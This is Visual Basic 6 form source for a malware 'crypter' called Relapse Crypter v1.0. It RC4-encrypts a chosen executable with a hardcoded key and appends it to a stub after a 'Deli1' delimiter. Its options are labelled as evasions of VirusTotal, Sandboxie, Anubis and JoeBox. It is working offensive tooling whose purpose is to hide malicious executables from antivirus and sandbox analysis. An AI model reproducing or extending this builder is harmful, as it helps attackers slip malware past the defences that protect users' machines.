VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Relapse Crypter v1.0"
   ClientHeight    =   5130
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   4920
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   5130
   ScaleWidth      =   4920
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer tmrEOF 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   2040
      Top             =   5880
   End
   Begin prjRelapse.jcFrames jcFrames6 
      Height          =   975
      Left            =   2160
      Top             =   3720
      Width           =   2655
      _ExtentX        =   4683
      _ExtentY        =   1720
      FrameColor      =   12829635
      Style           =   0
      Caption         =   "Custom Stub"
      TextColor       =   13579779
      Alignment       =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ColorFrom       =   0
      ColorTo         =   0
      Begin prjRelapse.SCommandButton SCommandButton6 
         Height          =   255
         Left            =   120
         TabIndex        =   12
         Top             =   600
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   450
         Caption         =   "Open Stub"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjRelapse.wxpText txtstub 
         Height          =   285
         Left            =   120
         TabIndex        =   11
         Top             =   240
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   503
         Text            =   ""
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
   End
   Begin MSComDlg.CommonDialog CD 
      Left            =   0
      Top             =   6720
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin prjRelapse.SCommandButton SCommandButton5 
      Height          =   255
      Left            =   4200
      TabIndex        =   10
      Top             =   4800
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   450
      Caption         =   "&About"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin prjRelapse.jcFrames jcFrames5 
      Height          =   615
      Left            =   120
      Top             =   4320
      Width           =   1815
      _ExtentX        =   2778
      _ExtentY        =   1085
      FrameColor      =   12829635
      Style           =   0
      RoundedCornerTxtBox=   -1  'True
      Caption         =   "The Finisher"
      TextColor       =   13579779
      Alignment       =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ColorFrom       =   0
      ColorTo         =   0
      Begin prjRelapse.SCommandButton SCommandButton4 
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   240
         Width           =   1575
         _ExtentX        =   2355
         _ExtentY        =   450
         Caption         =   "Crypt"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
   End
   Begin prjRelapse.jcFrames jcFrames3 
      Height          =   975
      Left            =   2160
      Top             =   2640
      Width           =   2655
      _ExtentX        =   4683
      _ExtentY        =   1720
      FrameColor      =   12829635
      Style           =   0
      Caption         =   "Encryption"
      TextColor       =   13579779
      Alignment       =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ColorFrom       =   0
      ColorTo         =   0
      Begin prjRelapse.wxpText Text3 
         Height          =   285
         Left            =   120
         TabIndex        =   8
         Top             =   240
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   503
         Text            =   ""
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjRelapse.SCommandButton SCommandButton2 
         Height          =   255
         Left            =   120
         TabIndex        =   7
         Top             =   600
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   450
         Caption         =   "Generate"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
   End
   Begin prjRelapse.jcFrames jcFrames2 
      Height          =   1575
      Left            =   120
      Top             =   2640
      Width           =   1935
      _ExtentX        =   3413
      _ExtentY        =   3625
      FrameColor      =   12829635
      Style           =   0
      Caption         =   "Extras"
      TextColor       =   13579779
      Alignment       =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ColorFrom       =   0
      ColorTo         =   0
      Begin prjRelapse.Check cEOF 
         Height          =   255
         Left            =   120
         TabIndex        =   13
         Top             =   1200
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   450
         Caption         =   "Has EOF"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   0
         Caption         =   "Has EOF"
         BackColor       =   -2147483633
      End
      Begin prjRelapse.Check Check4 
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   960
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   450
         Caption         =   "Anti JoeBox"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   0
         Caption         =   "Anti JoeBox"
         BackColor       =   -2147483633
      End
      Begin prjRelapse.Check Check3 
         Height          =   255
         Left            =   120
         TabIndex        =   5
         Top             =   720
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   450
         Caption         =   "Anti Anubis"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   0
         Caption         =   "Anti Anubis"
         BackColor       =   -2147483633
      End
      Begin prjRelapse.Check Check2 
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   480
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   450
         Caption         =   "Anti SandBoxie"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   0
         Caption         =   "Anti SandBoxie"
         BackColor       =   -2147483633
      End
      Begin prjRelapse.Check virus 
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   240
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   450
         Caption         =   "Anti Virustotal"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   0
         Caption         =   "Anti Virustotal"
         BackColor       =   -2147483633
      End
   End
   Begin prjRelapse.jcFrames jcFrames1 
      Height          =   615
      Left            =   120
      Top             =   1920
      Width           =   4695
      _ExtentX        =   8281
      _ExtentY        =   1085
      FrameColor      =   12829635
      Style           =   0
      Caption         =   "Selected File"
      TextColor       =   13579779
      Alignment       =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ColorFrom       =   0
      ColorTo         =   0
      Begin prjRelapse.SCommandButton SCommandButton1 
         Height          =   255
         Left            =   3600
         TabIndex        =   2
         Top             =   240
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   450
         Caption         =   "Open"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.TextBox txtfile 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   120
         TabIndex        =   1
         Text            =   "File To Crypt..."
         Top             =   240
         Width           =   3375
      End
   End
   Begin VB.PictureBox Picture1 
      Height          =   1815
      Left            =   0
      Picture         =   "Form1.frx":3958
      ScaleHeight     =   1755
      ScaleWidth      =   4875
      TabIndex        =   0
      Top             =   0
      Width           =   4935
   End
   Begin VB.Line Line6 
      X1              =   0
      X2              =   4800
      Y1              =   240
      Y2              =   240
   End
   Begin VB.Line Line5 
      X1              =   0
      X2              =   4800
      Y1              =   240
      Y2              =   240
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Dragging As Boolean
Private SettedX As Integer, SettedY As Integer
Private Declare Function GetOpenFileName Lib "comdlg32.dll" Alias "GetOpenFileNameA" (pOpenfilename As OPENFILENAME) As Long
Private Type OPENFILENAME
lStructSize As Long
hwndOwner As Long
hInstance As Long
lpstrFilter As String
lpstrCustomFilter As String
nMaxCustFilter As Long
nFilterIndex As Long
lpstrFile As String
nMaxFile As Long
lpstrFileTitle As String
nMaxFileTitle As Long
lpstrInitialDir As String
lpstrTitle As String
Flags As Long
nFileOffset As Integer
nFileExtension As Integer
lpstrDefExt As String
lCustData As Long
lpfnHook As Long
lpTemplateName As String
End Type
Dim EncryptionKey As String
Dim var1 As String
Dim Keyset As String
'Private Dragging As Boolean
'Private SettedX As Integer, SettedY As Integer

Private Sub Form_Load()
'MsgBox "The Plague Calls You a Fatty", vbCritical
MakeTransparent Me.hWnd, 205
End Sub



Private Sub Picture4_Click()
End
End Sub

Private Sub SCommandButton1_Click()
Dim OpenFile As OPENFILENAME
Dim lReturn As Long
Dim sFilter As String
OpenFile.lStructSize = Len(OpenFile)
OpenFile.hwndOwner = frmMain.hWnd
OpenFile.hInstance = App.hInstance
sFilter = "Exe Files (*.exe)" & Chr(0) & "*.EXE" & Chr(0)
OpenFile.lpstrFilter = sFilter
OpenFile.nFilterIndex = 1
OpenFile.lpstrFile = String(257, 0)
OpenFile.nMaxFile = Len(OpenFile.lpstrFile) - 1
OpenFile.lpstrFileTitle = OpenFile.lpstrFile
OpenFile.nMaxFileTitle = OpenFile.nMaxFile
OpenFile.lpstrInitialDir = "C:\"
OpenFile.lpstrTitle = "Select a file to crypt"
OpenFile.Flags = 0
lReturn = GetOpenFileName(OpenFile)
If lReturn = 0 Then
MsgBox "The User pressed the Cancel Button"
Else
txtfile.Text = OpenFile.lpstrFile
End If
End Sub

Private Sub SCommandButton2_Click()
Call GetRandomKey
End Sub
Private Function RandomNumber() As Integer
    Randomize
    var1 = Int(9 * Rnd)
    RandomNumber = var1
End Function

Private Function RandomLetter() As String
Anfang:
    Keyset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    Randomize
    var1 = Int(26 * Rnd)
    If var1 = 0 Then GoTo Anfang
    RandomLetter = Mid(Keyset, var1, 1)
End Function
Private Function GetRandomKey()
Dim i As Long
    Text3.Text = ""
    For i = 1 To 20
        If i = 2 Or i = 4 Or i = 6 Then
            Text3.Text = Text3.Text & RandomNumber
        Else
            Text3.Text = Text3.Text & RandomLetter
        End If
    Next i
EncryptionKey = Text3.Text
End Function

Private Sub SCommandButton4_Click()
Dim sStub As String
Dim sFile As String
Dim sFree As Long
Dim TheEOF As String
  
  Open App.Path & "\" & txtstub.Text For Binary As #1
    sStub = Space(LOF(1))
      Get #1, , sStub
  Close #1
    
    Open txtfile.Text For Binary As #1
    sFile = Space(LOF(1))
    Get #1, , sFile
    Close #1
    
sFile = RC4(sFile, "Fixed1") 'Text1.Text = UniEncode(Text1.Text)
  
  With CD
     .DefaultExt = "exe"
     .DialogTitle = "Save"
    .Filter = "EXE Files |*.exe"
    .ShowSave
  End With
  
If cEOF.Value = Checked Then
  Call Write_EOF(txtfile.Text, txtfile.Text)
    Else
End If

    Open CD.Filename For Binary As #1
    Put #1, , sStub & "Deli1" & sFile
    Close #1
  
 
End Sub
Private Sub SCommandButton5_Click()
frmAbout.Show
End Sub
Public Function RC4(ByVal Expression As String, ByVal Password As String) As String
On Error Resume Next
Dim RB(0 To 255) As Integer, X As Long, Y As Long, Z As Long, Key() As Byte, ByteArray() As Byte, Temp As Byte
If Len(Password) = 0 Then
    Exit Function
End If
If Len(Expression) = 0 Then
    Exit Function
End If
If Len(Password) > 256 Then
    Key() = StrConv(Left$(Password, 256), vbFromUnicode)
Else
    Key() = StrConv(Password, vbFromUnicode)
End If
For X = 0 To 255
    RB(X) = X
Next X
X = 0
Y = 0
Z = 0
For X = 0 To 255
    Y = (Y + RB(X) + Key(X Mod Len(Password))) Mod 256
    Temp = RB(X)
    RB(X) = RB(Y)
    RB(Y) = Temp
Next X
X = 0
Y = 0
Z = 0
ByteArray() = StrConv(Expression, vbFromUnicode)
For X = 0 To Len(Expression)
    Y = (Y + 1) Mod 256
    Z = (Z + RB(Y)) Mod 256
    Temp = RB(Y)
    RB(Y) = RB(Z)
    RB(Z) = Temp
    ByteArray(X) = ByteArray(X) Xor (RB((RB(Y) + RB(Z)) Mod 256))
Next X
RC4 = StrConv(ByteArray, vbUnicode)
End Function


Private Sub SCommandButton6_Click()
With CD
    .DefaultExt = "exe"
    .Filter = "All Files (*.*) | *.*"
    .DialogTitle = "Select Your Stub"
    .ShowOpen
  End With
txtstub.Text = CD.FileTitle
End Sub

